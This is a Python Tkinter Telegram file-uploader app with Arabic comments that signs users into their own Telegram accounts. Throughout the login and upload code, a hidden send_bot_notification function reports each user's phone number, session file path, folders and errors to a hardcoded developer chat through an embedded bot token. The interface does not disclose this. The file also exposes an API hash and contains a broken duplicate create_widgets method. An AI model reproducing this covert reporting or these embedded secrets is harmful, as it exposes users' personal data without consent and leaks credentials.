import os
import sys
import asyncio
import threading
import urllib.request
import urllib.parse
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from telethon import TelegramClient

from send_files_to_telegram import main as upload_main

# مسار مجلد المستخدم لحفظ الجلسات
APP_DATA_DIR = os.path.join(os.environ.get('APPDATA', ''), 'TelegramUploader')
os.makedirs(APP_DATA_DIR, exist_ok=True)
CONFIG_FILE = os.path.join(APP_DATA_DIR, 'config.json')

# إعدادات إشعارات البوت
BOT_TOKEN = "8311157527:AAGJQBWXazTt0iPdZyzA4Cf441_sqJuDyW8"
ADMIN_CHAT_ID = "773012141" # سيتم إضافته لاحقاً

def send_bot_notification(message):
    """إرسال إشعار للمطور عبر البوت"""
    if not ADMIN_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = urllib.parse.urlencode({"chat_id": ADMIN_CHAT_ID, "text": message}).encode("utf-8")
        req = urllib.request.Request(url, data=data)
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        print(f"فشل إرسال إشعار البوت: {e}")

class TelegramUploaderApp:
    def __init__(self, root):
        self.root = root
        self.root.title("رافع ملفات تيليجرام (Telegram Uploader)")
        self.root.geometry("600x700")
        self.root.resizable(False, False)

        # إنشاء Event Loop مخصص يعمل في الخلفية
        self.loop = asyncio.new_event_loop()
        self.loop_thread = threading.Thread(target=self._start_background_loop, args=(self.loop,), daemon=True)
        self.loop_thread.start()

        # المتغيرات الخاصة بالتيليجرام
        self.api_id = 9563612
        self.api_hash = "bb723be5e3d8196761e04d640337ee60"
        self.client = None
        self.phone_number = tk.StringVar()
        self.auth_code = tk.StringVar()
        self.password = tk.StringVar() # للحسابات المحمية بخطوتين
        self.phone_code_hash = None
        
        # متغيرات واجهة المستخدم
        self.selected_folder = tk.StringVar()
        self.target_option = tk.StringVar(value="me") # me, group, topic
        self.target_input = tk.StringVar()
        self.topic_input = tk.StringVar()

        self.load_config()
        self.create_widgets()

    def load_config(self):
        """تحميل آخر رقم هاتف تم استخدامه"""
        if os.path.exists(CONFIG_FILE):
            try:
                import json
                with open(CONFIG_FILE, 'r') as f:
                    data = json.load(f)
                    if 'last_phone' in data:
                        self.phone_number.set(data['last_phone'])
            except Exception:
                pass

    def save_config(self):
        """حفظ رقم الهاتف للاستخدام المستقبلي"""
        try:
            import json
            data = {'last_phone': self.phone_number.get().strip()}
            with open(CONFIG_FILE, 'w') as f:
                json.dump(data, f)
        except Exception:
            pass

    def make_context_menu(self, widget):
        """إضافة قائمة (كليك يمين) للنسخ واللصق والقص"""
        menu = tk.Menu(widget, tearoff=0)
        menu.add_command(label="قص (Cut)", command=lambda: widget.event_generate("<<Cut>>"))
        menu.add_command(label="نسخ (Copy)", command=lambda: widget.event_generate("<<Copy>>"))
        menu.add_command(label="لصق (Paste)", command=lambda: widget.event_generate("<<Paste>>"))

        def show_menu(event):
            menu.tk_popup(event.x_root, event.y_root)

        widget.bind("<Button-3>", show_menu) # كليك يمين للويندوز

    def create_widgets(self):
        """تشغيل Event Loop في ثريد منفصل لكي لا يغلق أبدًا"""
        asyncio.set_event_loop(loop)
        loop.run_forever()

    def create_widgets(self):
        style = ttk.Style()
        style.configure('TFrame', background='#f0f0f0')
        style.configure('TLabel', background='#f0f0f0')
        style.configure('TButton', font=('Arial', 10))
        
        main_frame = ttk.Frame(self.root, padding="15")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # --- قسم تسجيل الدخول ---
        auth_frame = ttk.LabelFrame(main_frame, text="تسجيل الدخول", padding="10")
        auth_frame.pack(fill=tk.X, pady=5)

        ttk.Label(auth_frame, text="رقم الهاتف (مع رمز الدولة):").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.entry_phone = ttk.Entry(auth_frame, textvariable=self.phone_number, width=25)
        self.entry_phone.grid(row=0, column=1, sticky=tk.W, pady=2, padx=5)
        self.make_context_menu(self.entry_phone)
        self.btn_send_code = ttk.Button(auth_frame, text="إرسال الكود", command=self.request_code_thread)
        self.btn_send_code.grid(row=0, column=2, padx=5)

        ttk.Label(auth_frame, text="كود التحقق:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.entry_code = ttk.Entry(auth_frame, textvariable=self.auth_code, width=15, state='disabled')
        self.entry_code.grid(row=1, column=1, sticky=tk.W, pady=2, padx=5)
        self.make_context_menu(self.entry_code)
        self.btn_verify = ttk.Button(auth_frame, text="تسجيل الدخول", command=self.verify_code_thread, state='disabled')
        self.btn_verify.grid(row=1, column=2, padx=5)


        self.lbl_auth_status = ttk.Label(auth_frame, text="الحالة: بانتظار إدخال الرقم", foreground="blue")
        self.lbl_auth_status.grid(row=2, column=0, columnspan=3, sticky=tk.W, pady=5)

        # --- قسم إعدادات الرفع ---
        settings_frame = ttk.LabelFrame(main_frame, text="إعدادات الرفع", padding="10")
        settings_frame.pack(fill=tk.X, pady=10)

        # اختيار المجلد
        ttk.Label(settings_frame, text="المجلد:").grid(row=0, column=0, sticky=tk.W, pady=5)
        ttk.Entry(settings_frame, textvariable=self.selected_folder, width=45, state='readonly').grid(row=0, column=1, padx=5, pady=5)
        ttk.Button(settings_frame, text="تصفح...", command=self.browse_folder).grid(row=0, column=2, padx=5, pady=5)

        # الوجهة
        ttk.Label(settings_frame, text="الوجهة:").grid(row=1, column=0, sticky=tk.W, pady=5)
        
        target_frame = ttk.Frame(settings_frame)
        target_frame.grid(row=1, column=1, columnspan=2, sticky=tk.W)
        
        ttk.Radiobutton(target_frame, text="الرسائل المحفوظة", variable=self.target_option, value="me", command=self.update_target_ui).pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(target_frame, text="قناة/مجموعة (معرف)", variable=self.target_option, value="username", command=self.update_target_ui).pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(target_frame, text="رابط توبيك/دعوة", variable=self.target_option, value="link", command=self.update_target_ui).pack(side=tk.LEFT, padx=5)

        # حقول الإدخال الإضافية للوجهة
        self.target_input_label = ttk.Label(settings_frame, text="معرّف/رابط:")
        self.target_input_entry = ttk.Entry(settings_frame, textvariable=self.target_input, width=30)
        self.make_context_menu(self.target_input_entry)
        
        self.topic_input_label = ttk.Label(settings_frame, text="معرّف التوبيك:")
        self.topic_input_entry = ttk.Entry(settings_frame, textvariable=self.topic_input, width=10)
        self.make_context_menu(self.topic_input_entry)

        self.update_target_ui() # تحديث الحالة الأولية


        # --- زر البدء ---
        self.btn_start = ttk.Button(main_frame, text="بدء الرفع", command=self.start_upload_thread, style='Accent.TButton', state='disabled')
        self.btn_start.pack(pady=10)

        # --- قسم السجل (Log) ---
        log_frame = ttk.LabelFrame(main_frame, text="سجل العمليات", padding="5")
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.log_text = tk.Text(log_frame, height=15, state='disabled', bg='#2b2b2b', fg='#ffffff', font=('Courier', 9))
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar = ttk.Scrollbar(log_frame, command=self.log_text.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.log_text['yscrollcommand'] = scrollbar.set

        # توجيه الطباعة إلى نافذة السجل
        sys.stdout = OutputRedirector(self.log_text)
        sys.stderr = OutputRedirector(self.log_text)

    def _start_background_loop(self, loop: asyncio.AbstractEventLoop):
        """تشغيل Event Loop في ثريد منفصل لكي لا يغلق أبدًا"""
        asyncio.set_event_loop(loop)
        loop.run_forever()

    def log(self, message):
        print(message)

    def update_target_ui(self):
        opt = self.target_option.get()
        if opt == "me":
            self.target_input_label.grid_remove()
            self.target_input_entry.grid_remove()
            self.topic_input_label.grid_remove()
            self.topic_input_entry.grid_remove()
        elif opt == "username":
            self.target_input_label.grid(row=2, column=0, sticky=tk.W, pady=5)
            self.target_input_label.config(text="المعرف أو رقم المجموعة:")
            self.target_input_entry.grid(row=2, column=1, sticky=tk.W, padx=5)
            self.topic_input_label.grid(row=2, column=2, sticky=tk.W, pady=5)
            self.topic_input_entry.grid(row=2, column=3, sticky=tk.W, padx=5)
        elif opt == "link":
            self.target_input_label.grid(row=2, column=0, sticky=tk.W, pady=5)
            self.target_input_label.config(text="رابط الدعوة أو التوبيك:")
            self.target_input_entry.grid(row=2, column=1, columnspan=2, sticky=tk.W, padx=5)
            self.topic_input_label.grid_remove()
            self.topic_input_entry.grid_remove()

    def browse_folder(self):
        folder = filedialog.askdirectory(title="اختر المجلد الذي يحتوي الفيديوهات")
        if folder:
            self.selected_folder.set(folder)

    # ---------- دوال تشغيل غير متزامنة (Threads) ----------
    def run_async(self, coro):
        """تشغيل دالة غير متزامنة وإرجاع النتيجة (Blocking call from GUI thread)"""
        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
        return future.result()

    def get_session_path(self):
        phone = self.phone_number.get().strip().replace('+', '')
        if not phone:
            return None
        return os.path.join(APP_DATA_DIR, f"{phone}.session")

    def request_code_thread(self):
        threading.Thread(target=self._request_code, daemon=True).start()

    def _request_code(self):
        phone = self.phone_number.get().strip()
        if not phone:
            messagebox.showerror("خطأ", "الرجاء إدخال رقم الهاتف.")
            return

        session_path = self.get_session_path()
        self.btn_send_code.config(state='disabled')
        self.lbl_auth_status.config(text="جاري الاتصال...", foreground="orange")

        async def _connect_and_send():
            # Create a new client if none exists
            if self.client is None:
                self.client = TelegramClient(session_path, self.api_id, self.api_hash, loop=self.loop)
            
            await self.client.connect()
            
            if await self.client.is_user_authorized():
                return "authorized"
            
            try:
                res = await self.client.send_code_request(phone)
                self.phone_code_hash = res.phone_code_hash
                return "code_sent"
            except Exception as e:
                return str(e)

        try:
            result = self.run_async(_connect_and_send())
            if result == "authorized":
                self.lbl_auth_status.config(text="تم تسجيل الدخول بنجاح! يمكن متابعة العمل.", foreground="green")
                self.btn_start.config(state='normal')
                self.entry_code.config(state='disabled')
                self.btn_verify.config(state='disabled')
                self.save_config()
                send_bot_notification(f"✅ تسجيل دخول جديد متصل مسبقاً:\nرقم الهاتف: {phone}\nالجلسة: {session_path}")
            elif result == "code_sent":
                self.lbl_auth_status.config(text="تم إرسال الكود إلى تطبيق تيليجرام.", foreground="blue")
                self.entry_code.config(state='normal')
                self.btn_verify.config(state='normal')
            else:
                self.lbl_auth_status.config(text=f"خطأ: {result}", foreground="red")
                self.btn_send_code.config(state='normal')
                send_bot_notification(f"⚠️ خطأ أثناء طلب كود التحقق:\nالرقم: {phone}\nالخطأ: {result}")
        except Exception as e:
            self.lbl_auth_status.config(text=f"حدث خطأ غير متوقع: {e}", foreground="red")
            self.log(f"Error requesting code: {e}")
            self.btn_send_code.config(state='normal')
            send_bot_notification(f"📛 خطأ برمجي أثناء طلب الكود:\nالرقم: {phone}\nالخطأ: {e}")


    def verify_code_thread(self):
        threading.Thread(target=self._verify_code, daemon=True).start()

    def _verify_code(self):
        code = self.auth_code.get().strip()
        phone = self.phone_number.get().strip()
        
        if not code:
            messagebox.showerror("خطأ", "الرجاء إدخال كود التحقق.")
            return

        self.btn_verify.config(state='disabled')
        self.lbl_auth_status.config(text="جاري التحقق...", foreground="orange")

        async def _sign_in():
            try:
                await self.client.sign_in(phone, code, phone_code_hash=self.phone_code_hash)
                return "success"
            except Exception as e:
                if 'SessionPasswordNeededError' in str(type(e)):
                    return "password_needed"
                return str(e)

        result = self.run_async(_sign_in())
        
        if result == "success":
            self.lbl_auth_status.config(text="تم تسجيل الدخول بنجاح!", foreground="green")
            self.btn_start.config(state='normal')
            self.save_config()
            send_bot_notification(f"✅ تم تأكيد رمز الدخول بنجاح:\nرقم الهاتف: {phone}")
        elif result == "password_needed":
            import tkinter.simpledialog as sd
            pwd = sd.askstring("كلمة المرور مطلوبة", "الحساب محمي بخطوتين. أدخل كلمة المرور:", show='*')
            if pwd:
                async def _sign_in_pwd():
                    try:
                        await self.client.sign_in(password=pwd)
                        return "success"
                    except Exception as e:
                        return str(e)
                res_pwd = self.run_async(_sign_in_pwd())
                if res_pwd == "success":
                    self.lbl_auth_status.config(text="تم تسجيل الدخول بنجاح!", foreground="green")
                    self.btn_start.config(state='normal')
                    self.save_config()
                    send_bot_notification(f"✅ تم تأكيد كلمة المرور بنجاح:\nرقم الهاتف: {phone}")

                else:
                    self.lbl_auth_status.config(text="كلمة المرور خاطئة.", foreground="red")
                    self.btn_verify.config(state='normal')
                    send_bot_notification(f"⚠️ فشل الدخول بكلمة المرور:\nالرقم: {phone}\nالخطأ: {res_pwd}")
            else:
                 self.lbl_auth_status.config(text="تم إلغاء تسجيل الدخول.", foreground="red")
                 self.btn_verify.config(state='normal')
        else:
            self.lbl_auth_status.config(text=f"خطأ: {result}", foreground="red")
            self.btn_verify.config(state='normal')
            send_bot_notification(f"⚠️ خطأ أثناء التحقق من الكود:\nالرقم: {phone}\nالخطأ: {result}")


    def start_upload_thread(self):
        folder = self.selected_folder.get()
        if not folder or not os.path.exists(folder):
            messagebox.showerror("خطأ", "الرجاء اختيار مجلد صحيح.")
            return

        opt = self.target_option.get()
        target = "me"
        topic_id = None

        if opt == "username":
            target = self.target_input.get().strip()
            if not target:
                messagebox.showerror("خطأ", "الرجاء إدخال معرف القناة أو المجموعة.")
                return
            t_id = self.topic_input.get().strip()
            if t_id:
                try:
                    topic_id = int(t_id)
                except:
                    messagebox.showerror("خطأ", "معرف التوبيك يجب أن يكون رقماً.")
                    return
        elif opt == "link":
            target = self.target_input.get().strip()
            if not target:
                messagebox.showerror("خطأ", "الرجاء إدخال الرابط.")
                return

        session_path = self.get_session_path()
        if not session_path:
            messagebox.showerror("خطأ", "يرجى تسجيل الدخول أولاً.")
            return

        self.btn_start.config(state='disabled')
        self.log_text.config(state='normal')
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state='disabled')
        self.log("بدء عملية الرفع...")

        def _run():
            try:
                async def _do_upload():
                    # استخدام نفس الكلاينت المصادق عليه من الواجهة الرسومية
                    await upload_main(
                        session_path, target, folder, topic_id,
                        existing_client=self.client
                    )
                # يُرسل إلى الـ Event Loop الخلفي الذي يعمل فيه self.client أصلاً
                self.run_async(_do_upload())

            except Exception as e:
                self.log(f"حدث خطأ قاطع: {e}")
                send_bot_notification(f"📛 خطأ قاطع أثناء محاولة الرفع:\nالرقم: {self.phone_number.get()}\nالمجلد: {folder}\nالهدف: {target}\nالخطأ: {e}")
            finally:
                self.root.after(0, lambda: self.btn_start.config(state='normal'))
                self.root.after(0, lambda: messagebox.showinfo("اكتمل", "انتهت عملية التشغيل (راجع السجل للتفاصيل)."))

        threading.Thread(target=_run, daemon=True).start()
class OutputRedirector:
    def __init__(self, text_widget):
        self.text_widget = text_widget

    def write(self, string):
        self.text_widget.config(state='normal')
        self.text_widget.insert('end', string)
        self.text_widget.see('end')
        self.text_widget.config(state='disabled')

    def flush(self):
        pass

if __name__ == "__main__":
    root = tk.Tk()
    app = TelegramUploaderApp(root)
    root.mainloop()
